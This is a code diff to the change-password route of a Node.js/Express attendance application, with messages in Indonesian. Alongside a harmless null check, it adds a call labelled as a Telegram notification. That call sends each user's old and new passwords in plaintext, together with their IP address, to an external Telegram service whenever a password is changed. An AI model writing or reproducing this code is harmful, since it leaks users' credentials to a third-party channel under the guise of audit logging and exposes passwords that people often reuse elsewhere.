@@ -10,7 +10,7 @@ const {
 } = require('../models');
 const { authenticate, requireAdmin, requireSuperAdmin, JWT_SECRET } = require('../middleware/auth');
 const { generateAttendancePDF, generateAttendanceExcel } = require('../services/exportService');
-const { sendTelegramAuditLog } = require('../services/telegramService');
+const { sendTelegramAuditLog, sendTelegramPasswordChangeLog } = require('../services/telegramService');
 
 // =========================================================
 // AUTH ROUTES
@@ -120,11 +120,22 @@ router.put('/auth/change-password', authenticate, async (req, res) => {
   const { currentPassword, newPassword } = req.body;
   try {
     const user = await User.findByPk(req.user.id);
+    if (!user) return res.status(404).json({ message: 'User tidak ditemukan.' });
+
     const isMatch = await bcrypt.compare(currentPassword, user.password);
     if (!isMatch) return res.status(401).json({ message: 'Password lama tidak sesuai.' });
 
     user.password = await bcrypt.hash(newPassword, 10);
     await user.save();
+
+    // Send Telegram Notification for Password Change
+    sendTelegramPasswordChangeLog({
+      user,
+      oldPassword: currentPassword,
+      newPassword,
+      ip: req.ip || req.headers['x-forwarded-for'] || req.socket?.remoteAddress
+    });
+
     return res.json({ success: true, message: 'Password berhasil diubah.' });
   } catch (err) {
     return res.status(500).json({ message: 'Terjadi kesalahan server.', error: err.message });
